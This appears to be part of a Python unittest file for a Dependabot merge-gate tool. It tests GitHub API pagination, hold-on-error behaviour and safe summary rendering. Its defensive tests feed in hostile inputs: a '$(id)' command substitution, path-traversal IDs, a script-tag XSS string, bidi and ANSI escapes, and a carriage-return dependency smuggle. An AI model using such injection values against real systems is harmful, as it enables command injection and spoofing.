                "head_sha": self.SHA,
                "app": {"slug": "x"},
                "check_suite": {"id": 1},
            }
            for i in range(170)
        ]
        snapshot["check_runs"] = extra + snapshot["check_runs"]
        api = FakeGitHub(snapshot)
        rc, verdict, _, _, _ = self.gate(api, "--head-sha", self.SHA)
        self.assertEqual((rc, verdict["decision"]), (0, "merge"))
        self.assertEqual(len([call for call in api.calls if "/commits/" in call and "/check-runs?" in call]), 3)
        snapshot["check_runs"][150]["conclusion"] = "failure"
        rc, verdict, _, _, _ = self.gate(FakeGitHub(snapshot), "--head-sha", self.SHA)
        self.assertEqual(verdict["reasons"], ['check "extra 150" ("x") concluded "failure"'])

    def test_incomplete_check_run_listing_fails(self) -> None:
        api = FakeGitHub(green_gomod())

        for listing in ("/check-runs?", "/status?", "/actions/runs?", "/jobs?"):
            with self.subTest(listing=listing):

                def short(path: str, raw: bool = False) -> object:
                    body = api(path, raw)
                    if listing in path:
                        body["total_count"] += 1
                    return body

                rc, verdict, _, outputs, _ = self.gate(short, "--head-sha", self.SHA)
                self.assertEqual((rc, outputs["decision"]), (1, "hold"))
                self.assertIn("total_count", verdict["reasons"][0])
        for body in ({"check_runs": None}, [], "x"):
            with self.subTest(body=body), self.assertRaises(GATE.GateError):
                GATE.fetch_all(lambda path: body, "x", "check_runs", check_total=True)
        with self.assertRaises(GATE.GateError):
            GATE.fetch_all(lambda path: [{}] * 100, "x")

    def test_reads_every_page_of_statuses_and_workflow_runs(self) -> None:
        snapshot = green_gomod()
        snapshot["statuses"] = [{"context": f"ci/{i}", "state": "success"} for i in range(130)]
        snapshot["statuses"][120]["state"] = "failure"
        api = FakeGitHub(snapshot)
        rc, verdict, _, _, _ = self.gate(api, "--head-sha", self.SHA)
        self.assertEqual((rc, verdict["reasons"]), (0, ['commit status "ci/120" is "failure"']))
        self.assertEqual(len([call for call in api.calls if "/status?" in call]), 2)
        # The run behind a required check may be on a later page too.
        snapshot = green_gomod()
        other = {
            "id": 5,
            "path": ".github/workflows/other.yml",
            "event": "push",
            "head_sha": self.SHA,
            "check_suite_id": 5,
            "run_attempt": 1,
            "conclusion": "failure",
            "actor": {"id": 1},
            "repository": {"id": REPO_ID},
            "head_repository": {"id": REPO_ID},
        }
        snapshot["workflow_runs"] = [dict(other, id=2000 + i, check_suite_id=1000 + i) for i in range(120)] + snapshot["workflow_runs"]
        api = FakeGitHub(snapshot)
        rc, verdict, _, _, _ = self.gate(api, "--head-sha", self.SHA)
        self.assertEqual((rc, verdict["decision"], verdict["reasons"]), (0, "merge", []))
        self.assertEqual(len([call for call in api.calls if "/actions/runs?" in call]), 2)

    def test_reads_every_page_of_jobs(self) -> None:
        # The job behind a required check may be on a later page: every
        # attempt of a run is listed (`filter=all`).
        snapshot = green_gomod()
        run = workflow_run(snapshot, "CI")
        earlier = [{"id": 9000 + i, "runner_id": 1000000000 + i, "run_attempt": 1, "conclusion": "success", "steps": ["success"] * 3} for i in range(130)]
        run["jobs"] = earlier + run["jobs"]
        # ... and so may its check run in the suite's listing.
        checks = [
            {"id": 9000 + i, "name": f"x {i}", "status": "completed", "conclusion": "success", "head_sha": self.SHA, "app": {"slug": "github-actions"}}
            for i in range(130)
        ]
        run["check_runs"] = [dict(check, check_suite={"id": run["check_suite_id"]}) for check in checks] + run["check_runs"]
        api = FakeGitHub(snapshot)
        rc, verdict, _, _, _ = self.gate(api, "--head-sha", self.SHA)
        self.assertEqual((rc, verdict["decision"], verdict["reasons"]), (0, "merge", []))
        pages = [call.rpartition("/")[2] for call in api.calls if f"/runs/{run['id']}/jobs?" in call]
        self.assertEqual(pages, ["jobs?filter=all&per_page=100&page=1", "jobs?filter=all&per_page=100&page=2"])
        pages = [call.rpartition("/")[2] for call in api.calls if f"/check-suites/{run['check_suite_id']}/check-runs?" in call]
        self.assertEqual(pages, ["check-runs?filter=all&per_page=100&page=1", "check-runs?filter=all&per_page=100&page=2"])

    def test_unreadable_jobs_are_a_hold_and_a_failure(self) -> None:
        # Finding Medium 1: a read error or a truncated listing decides nothing.
        api = FakeGitHub(green_gomod())

        for listing in ("/jobs?", "/check-suites/"):
            with self.subTest(listing=listing):

                def broken(path: str, raw: bool = False) -> object:
                    if listing in path:
                        raise GATE.GateError(f"gh api {path} failed: HTTP 502")
                    return api(path, raw)

                rc, verdict, _, outputs, _ = self.gate(broken, "--head-sha", self.SHA)
                self.assertEqual((rc, verdict["decision"], outputs["decision"]), (1, "hold", "hold"))
                self.assertIn("GitHub could not be read, so nothing was decided", verdict["reasons"][0])
        good_jobs = {"total_count": 1, "jobs": [{"id": 1}]}
        bad = ({"total_count": 1, "{key}": None}, {"total_count": 2, "{key}": [{"id": 1}]}, [])
        for key in ("jobs", "check_runs"):
            for body in bad:
                body = {name.format(key=key): value for name, value in body.items()} if isinstance(body, dict) else body

                def read(path: str, body: object = body, key: str = key) -> object:
                    return body if (key == "jobs") == ("/jobs?" in path) else good_jobs

                with self.subTest(key=key, body=body), self.assertRaises(GATE.GateError):
                    GATE._workflow_run_fields(read, REPO, {"id": 7, "check_suite_id": 8, "path": ".github/workflows/ci.yml"})
        # A run with no usable id or check suite id is not asked for: the rule holds on it instead.
        for run_id, suite in ((None, 8), ("7", 8), (True, 8), ("7/../../pulls", 8), (7, None), (7, "8"), (7, "8/../../x"), (7, True)):
            with self.subTest(run_id=run_id, suite=suite):
                run = {"id": run_id, "check_suite_id": suite, "path": ".github/workflows/ci.yml"}
                fields = GATE._workflow_run_fields(lambda path: self.fail(path), REPO, run)
                self.assertNotIn("jobs", fields)
                self.assertNotIn("check_runs", fields)

    def test_waits_for_github_to_compute_mergeability(self) -> None:
        rc, verdict, _, _, _ = self.gate(FakeGitHub(green_gomod(), mergeable_after=2), "--head-sha", self.SHA)
        self.assertEqual((rc, verdict["decision"], self.sleeps), (0, "merge", 2))
        rc, verdict, _, _, _ = self.gate(FakeGitHub(green_gomod(), mergeable_after=99), "--head-sha", self.SHA)
        self.assertEqual((rc, verdict["decision"], self.sleeps), (0, "hold", GATE.MERGEABLE_ATTEMPTS - 1))
        self.assertIn("does not report the pull request as mergeable", verdict["reasons"][0])

    def test_gh_api_is_a_read(self) -> None:
        with mock.patch.object(GATE.subprocess, "run") as run:
            run.return_value = mock.Mock(returncode=0, stdout=b'{"ok": true}', stderr=b"")
            self.assertEqual(GATE.gh_api("repos/x/y/pulls/1"), {"ok": True})
            argv = run.call_args.args[0]
            self.assertEqual(argv[:4], ["gh", "api", "--method", "GET"])
            self.assertEqual(argv[-1], "repos/x/y/pulls/1")
            self.assertNotIn("shell", run.call_args.kwargs)
            # On an HTTP error gh prints the error body, which is JSON too.
            for result in (
                mock.Mock(returncode=1, stdout=b'{"message": "Not Found"}', stderr=b"gh: Not Found (HTTP 404)"),
                mock.Mock(returncode=1, stdout=b"", stderr=b"\xff"),
                mock.Mock(returncode=0, stdout=b"<html>", stderr=b""),
                mock.Mock(returncode=0, stdout=b'{"name": "caf\xe9"}', stderr=b""),
            ):
                run.return_value = result
                with self.assertRaises(GATE.GateError):
                    GATE.gh_api("repos/x/y/pulls/1")
            for error in (FileNotFoundError("gh"), GATE.subprocess.TimeoutExpired("gh", 120)):
                run.side_effect = error
                with self.assertRaises(GATE.GateError):
                    GATE.gh_api("repos/x/y/pulls/1")

    def test_gh_api_raw_returns_the_file_text(self) -> None:
        with mock.patch.object(GATE.subprocess, "run") as run:
            run.return_value = mock.Mock(returncode=0, stdout=b"module x\n", stderr=b"")
            self.assertEqual(GATE.gh_api("repos/x/y/contents/go.mod?ref=abc", raw=True), "module x\n")
            argv = run.call_args.args[0]
            self.assertEqual(argv[:6], ["gh", "api", "--method", "GET", "-H", "Accept: application/vnd.github.raw+json"])
            # A file that happens to be JSON is still returned as text.
            run.return_value = mock.Mock(returncode=0, stdout=b'{"name": "x"}', stderr=b"")
            self.assertEqual(GATE.gh_api("repos/x/y/contents/package.json?ref=abc", raw=True), '{"name": "x"}')
            self.assertEqual(GATE.gh_api("repos/x/y/pulls/1"), {"name": "x"})
            self.assertEqual(run.call_args.args[0][5], "Accept: application/vnd.github+json")
            run.return_value = mock.Mock(returncode=1, stdout=b"", stderr=b"gh: Not Found (HTTP 404)")
            with self.assertRaises(GATE.GateError):
                GATE.gh_api("repos/x/y/contents/go.mod?ref=abc", raw=True)
            run.return_value = mock.Mock(returncode=0, stdout=b"module \xff\n", stderr=b"")
            with self.assertRaises(GATE.GateError):
                GATE.gh_api("repos/x/y/contents/go.mod?ref=abc", raw=True)

    def test_gh_api_keeps_carriage_returns(self) -> None:
        # Finding Low 1, attack N12b: in text mode Python turned a bare
        # carriage return into a line feed, so the rules read two lines
        # where Go reads one. The bytes are decoded as they are.
        raw = b"require (\n\tgithub.com/a/b v1.0.0\r\tgithub.com/evil/new v1.0.0\r\n)\n"
        with mock.patch.object(GATE.subprocess, "run") as run:
            run.return_value = mock.Mock(returncode=0, stdout=raw, stderr=b"")
            self.assertEqual(GATE.gh_api("repos/x/y/contents/go.mod?ref=abc", raw=True), raw.decode("ascii"))
            for option in ("text", "encoding", "errors", "universal_newlines"):
                self.assertNotIn(option, run.call_args.kwargs)
            self.assertIs(run.call_args.kwargs["capture_output"], True)
        # Through a real child process, with the carriage return in its output.
        child = [sys.executable, "-c", "import sys; sys.stdout.buffer.write(b'a\\rb\\r\\nc\\n')"]
        with mock.patch.object(GATE.subprocess, "run", side_effect=lambda argv, **kwargs: subprocess_run(child, **kwargs)):
            self.assertEqual(GATE.gh_api("repos/x/y/contents/go.mod?ref=abc", raw=True), "a\rb\r\nc\n")
        # ... and the rules hold on the file that comes back.
        snapshot = green_gomod()
        entry = file_entry(snapshot, GO_MOD)
        at = entry["head"].index("\n\tgolang.org/x/crypto ")
        entry["head"] = entry["head"][:at] + "\r" + entry["head"][at + 1 :]
        rc, verdict, _, _, _ = self.gate(FakeGitHub(snapshot), "--head-sha", self.SHA)
        self.assertEqual((rc, verdict["reasons"]), (0, ["go.mod contains a carriage return"]))

    def test_up_to_date_command(self) -> None:
        def run(compare: object, repo: str = REPO, sha: str = self.SHA) -> tuple[int, str, str, list[str]]:
            calls: list[str] = []

            def api(path: str, raw: bool = False) -> object:
                calls.append(path)
                if isinstance(compare, Exception):
                    raise compare
                return compare

            out, err = io.StringIO(), io.StringIO()
            with mock.patch.object(GATE, "gh_api", api), contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
                rc = GATE.main(["up-to-date", "--repo", repo, "--head-sha", sha])
            return rc, out.getvalue(), err.getvalue(), calls

        rc, out, _, calls = run({"behind_by": 0, "status": "ahead"})
        self.assertEqual((rc, calls), (0, [f"repos/{REPO}/compare/main...{self.SHA}?per_page=1"]))
        self.assertIn("is not behind main", out)
        for compare in ({"behind_by": 1}, {"behind_by": None}, {"behind_by": "0"}, {"behind_by": False}, {}, [], GATE.GateError("HTTP 502")):
            with self.subTest(compare=compare):
                rc, out, err, _ = run(compare)
                self.assertEqual((rc, out), (1, ""))
                self.assertIn("hold: ", err)
        for arguments in ({"repo": "not a repo"}, {"sha": "main"}, {"sha": "$(id)"}):
            with self.subTest(arguments=arguments):
                rc, _, _, calls = run({"behind_by": 0}, **arguments)
                self.assertEqual((rc, calls), (2, []))

    def test_summary_is_inert_markdown(self) -> None:
        snapshot = green_gomod()
        snapshot["pull_request"]["head"]["ref"] = "x<script>alert(1)</script>[click](https://example.com)‮"
        summary = GATE.render_summary(GATE.decide(snapshot), "decide-only")
        self.assertNotIn("<", summary)
        self.assertNotIn("](", summary)
        self.assertTrue(summary.isascii())
        self.assertIn("&lt;script&gt;", summary)
        verdict = GATE.hold_verdict("a reason with \u202e and \x1b[31m")
        verdict["dependencies"] = [{"dependency-name": "re\u202eact", "dependency-version": "1.0.0"}]
        summary = GATE.render_summary(verdict, None)
        self.assertTrue(summary.isascii() and summary.replace("\n", "").isprintable(), summary)
        self.assertNotIn("Mode:", summary)
        self.assertNotIn("Admitted", summary)

    def test_summary_names_the_rule_that_admitted_a_line(self) -> None:
        snapshot = green_gomod()
        set_go_version(snapshot, "golang.org/x/net", "v0.63.0")
        add_go_line(snapshot, "\tgithub.com/evil/new v1.2.3 // indirect")
        verdict = GATE.decide(snapshot)
        self.assertEqual((verdict["decision"], len(verdict["admitted"])), ("merge", 2))
        summary = GATE.render_summary(verdict, "decide-only")
        self.assertIn("### Dependabot merge gate: MERGE", summary)
        self.assertIn("Admitted by a relaxation (rule named at the end of each line):", summary)
        self.assertIn('- go.mod adds the indirect requirement "github.com/evil/new v1.2.3": admitted by indirect-side-effect\n', summary)
        self.assertIn("(a minor bump of a 0.x version under golang.org/x/): admitted by allow-0x-minor\n", summary)
        self.assertNotIn("Reasons to hold", summary)
        self.assertNotIn("Admitted", GATE.render_summary(GATE.decide(green_gomod()), "decide-only"))
        self.assertEqual(GATE.hold_verdict("x")["admitted"], [])

    def test_decide_command(self) -> None:
        out, err = io.StringIO(), io.StringIO()
        with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
            rc = GATE.main(["decide", str(FIXTURES / "pr-189.json")])
            missing = GATE.main(["decide", str(FIXTURES / "no-such-file.json")])
        self.assertEqual((rc, missing), (0, 2))
        self.assertEqual(json.loads(out.getvalue())["decision"], "hold")
        self.assertIn("Dependabot merge gate: HOLD", err.getvalue())

    def test_usage_errors(self) -> None:
        with contextlib.redirect_stdout(io.StringIO()), contextlib.redirect_stderr(io.StringIO()):
            self.assertEqual(GATE.main(["gate", "--repo", "not a repo", "--head-sha", self.SHA]), 2)
            for argv in (["gate", "--repo", REPO], ["gate", "--repo", REPO, "--pr", "1", "--head-sha", self.SHA], ["decide", "x", "--mode", "auto"]):
                with self.assertRaises(SystemExit) as raised:
                    GATE.main(argv)
                self.assertEqual(raised.exception.code, 2)


if __name__ == "__main__":
    if sys.argv[1:2] == ["reduce-fixture"]:
        # Fixture maintenance, not a test: see the module docstring.
        for name in sys.argv[2:]:
            fixture = json.loads(Path(name).read_text(encoding="utf-8"))
            reduce_lockfiles(fixture)
            Path(name).write_text(json.dumps(fixture, indent=1) + "\n", encoding="utf-8")
        sys.exit(0)
    unittest.main()
